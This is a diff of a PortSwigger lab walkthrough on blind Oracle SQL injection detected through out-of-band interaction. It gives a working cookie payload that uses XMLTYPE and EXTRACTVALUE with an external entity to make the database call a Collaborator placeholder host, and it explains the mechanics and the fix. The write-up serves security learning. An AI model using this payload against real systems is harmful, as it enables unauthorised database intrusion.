@@ -1,39 +1,72 @@
 ---
 title: Blind SQL injection with out-of-band interaction
-date: '2025-06-18'
+date: '2026-07-15'
 tags:
   - PortSwigger
   - lab
   - sql-injection
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Blind SQL injection with out-of-band
-  interaction. Walkthrough with solution, key takeaways, and blind replay
-  exercise.
+excerpt: "The query runs async and never touches the response, so I force Oracle to look up a Collaborator hostname and take the DNS hit as proof the injection fired."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Blind SQL injection with out-of-band interaction
 
-## Objective
+Some labs you solve with your eyes, some with a stopwatch. This one you solve by making the database place a call to a server you control, because the response says nothing and even the clock stays silent.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+The shop still sets a `TrackingId` cookie and runs it through an analytics query. This time the database is Oracle, and two things differ from the timing labs.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+First, the query is executed asynchronously. It does not block the response, so a sleep gets you nowhere. Second, the result is never rendered and errors do not surface, so there is no in-band signal at all.
 
-## Key Takeaway
+That leaves outbound traffic. If I can make the database resolve a hostname I own, I have a channel even with a totally silent response.
 
-*Write ONE principle I must remember*
+## How the vulnerability works
 
-## Next-Day Blind Replay
+Oracle can be pushed into an HTTP request through an XML external entity. Feed `XMLTYPE()` a document with an external DTD and the parser resolves the `SYSTEM` entity while parsing.
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+`EXTRACTVALUE()` triggers that parse when you hand it the document and any XPath. The lookup leaves the database host as a DNS request. Burp Collaborator is a public listener that records exactly those DNS and HTTP hits, which is how I see a channel the app itself never reflects.
+
+## Solving it
+
+1. Open the Burp Collaborator client and click "Copy to clipboard" to generate a unique subdomain. That subdomain is what the payload calls home to. Collaborator is the listener, so nothing happens until a lookup actually reaches it.
+2. Intercept the request with the `TrackingId` cookie and inject the following, replacing the placeholder with the subdomain Collaborator gave you:
+
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+
+URL-encode the value before it goes into the cookie header.
+
+3. Send the request, then return to the Collaborator tab and click "Poll now". The lab's own response still looks completely normal.
+4. A DNS interaction appears against your subdomain. That interaction is the lab solved.
+
+## Why that payload works
+
+The cookie stays inside the original query, and `UNION SELECT` appends a second result set that runs my function. Oracle insists on a `FROM` clause, so `dual` fills that slot. The `XMLTYPE` document declares a parameter entity pointing at the Collaborator URL, and `%remote;` forces the parser to fetch it. `EXTRACTVALUE` is only there to make Oracle parse the document; its XPath argument, `'/l'`, is a throwaway that never matches anything. The DNS lookup is the side effect and the point.
+
+## The fix
+
+Parameterise the query and never let the cookie become SQL. Disable external entity and DTD resolution in every XML parser on the box, block outbound DNS and HTTP from the database tier, and run the app's database user with the least privilege it can get away with.
+
+<Accordion title="The Collaborator listener step">
+Burp Collaborator is a public server that Burp runs for you. It hands out a unique subdomain and records every DNS lookup, HTTP request, and SMTP connection that reaches it.
+
+Open the Burp Collaborator client, click **Copy to clipboard**, and paste the subdomain into the payload in place of the placeholder. That is the "Insert Collaborator payload" action, done by hand. Nothing is recorded until the database actually reaches out. If you send the request, poll, and see nothing, the payload did not fire: check the value is URL-encoded and that the quote balance still holds.
+</Accordion>
+
+<FlipCard
+  front={<div>Why UNION SELECT ... FROM dual and not plain concatenation?</div>}
+  back={<div>The cookie sits inside the original query, so UNION SELECT appends a second result set that runs your function. Oracle needs a FROM clause, and dual fills it.</div>}
+/>
+
+<Terminal
+  title="collaborator"
+  prompt="burp"
+  command="Poll now"
+  output={"DNS interaction recorded\n  host: <unique-subdomain>.burpcollaborator.net\n  triggered by the lab query during XML parsing"}
+/>
